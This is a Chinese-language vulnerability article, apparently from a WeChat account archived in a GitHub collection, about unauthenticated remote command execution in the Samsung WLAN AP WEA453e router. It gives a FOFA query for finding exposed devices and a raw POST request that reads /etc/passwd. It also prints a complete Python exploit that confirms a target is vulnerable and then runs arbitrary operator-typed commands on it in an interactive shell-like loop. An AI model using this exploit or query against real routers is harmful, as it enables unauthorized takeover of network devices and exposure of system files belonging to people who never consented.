---
fofa: "title=="
source: "MrWQ/vulnerability-paper"
---

# 三星 WLAN AP WEA453e 路由器  远程命令执行漏洞

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rse0hnR6C2AfvzWiN7t8Qg)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

 IPDB 蓝队威胁共享

帮助红蓝对抗项目，精准判断，已知红蓝对抗项目攻击情报资源池，无需登陆 - 添加认证进群，即可

![](https://mmbiz.qpic.cn/mmbiz_png/Svw665Wd5NB8VrSmgiaxcRWZBMHQynHen8TLs67KKLN2f0wuaWDut35butozRj3OVlgoFxRY6gqfPGKe130SibPw/640?wx_fmt=png)

微信进群须知 - 获得途径

需要出示红蓝对抗项目参与证明发给我方审核人员，通过后即可进入群内并获取平台也可同全国红蓝对抗项目参与人员共同交流与讨论。点击左下角 “阅读原文” 即可进入填报审核进入

**审核人员：** **hackjie10086**

**审核人员：   2785494744**

![](https://mmbiz.qpic.cn/mmbiz_png/Svw665Wd5NCDSf71XrCt5jE4Rf0TYu22a9IheTk8qia7kyuiaBquBYowG2IWMtJIMTEjXhib5cCZGP6rGlT6dClDQ/640?wx_fmt=png)

**一****：漏洞描述🐑**

**三星 WLAN AP WEA453e 路由器  存在远程命令执行漏洞，可在未授权的情况下执行任意命令获取服务器权限**

**二:  漏洞影响🐇**

**三星 WLAN AP WEA453e 路由器**

**三:  漏洞复现🐋**

```
FOFA title=="Samsung WLAN AP"
```

**登录页面如下**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuIoicOoufbHiazJkatrOgtv11kTaOWjFjVbmaI82q1ib55nrXeQWibJk1AA/640?wx_fmt=png)

**请求包如下**  

```
POST /(download)/tmp/a.txt HTTP/1.1
Host: xxx.xxx.xxx.xxx
Connection: close
Content-Length: 48

command1=shell:cat /etc/passwd| dd of=/tmp/a.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuWrEgt4WxnPb0qIWjlsicsl7VBdbQbpN0mpodoQibmraPicZgWTDeP8c7w/640?wx_fmt=png)

 ****四:  漏洞 POC🦉****

```
import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 三星 WLAN AP WEA453e路由器                                  \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/(download)/tmp/a.txt"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "command1=shell:cat /etc/passwd| dd of=/tmp/a.txt"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if "root" in response.text and response.status_code == 200:
            print("\033[36m[o] 目标 {} 存在漏洞, 响应为:\n{}\033[0m".format(target_url, response.text))
            while True:
                cmd = str(input("\033[35mCmd >>> \033[0m"))
                POC_2(target_url, cmd)
        else:
            print("\033[31m[x] 目标 {} 不存在默认管理员弱口令     \033[0m".format(target_url))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, cmd):
    vuln_url = target_url + "/(download)/tmp/a.txt"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "command1=shell:{}| dd of=/tmp/a.txt".format(cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[36m{} \033[0m".format(response.text))
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuviaGLXhzF7icWBFibgA3AEAXGiclQclvJAMw49MOTlc8d6icib7HHicNHauzw/640?wx_fmt=png)

```
三星 WLAN AP WEA453e路由器  远程命令执行漏洞
https://github.com/PeiQi0/PeiQi-WIKI-POC
Goby & POC 目录中~
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuWj95iatevYzaNtoYlt1RQCdCzUacoMj73Bd7CA3PRV4zzlmdwQ2MKcw/640?wx_fmt=png)

 ****五:  关于文库🦉****

**在线文库：**

**http://wiki.peiqi.tech**

**Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 想要投稿的师傅加我，我们一起建设文库啦~  
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZutPrMibmTTAHfiatovIDtcdpmXXwz5EZgcJWsDqeMWkfLDIDdHaJ6zlUA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZux37ib46Zf4OLE4YRx0u30mwicOPhTjibIabUJnZp3sqdtmfEyEa5jtZibg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuJ7Cckiaq60WwNVnHrV5oXRpI52JyjMaMSoxvf9iav3ib9iautF12Wp30kw/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
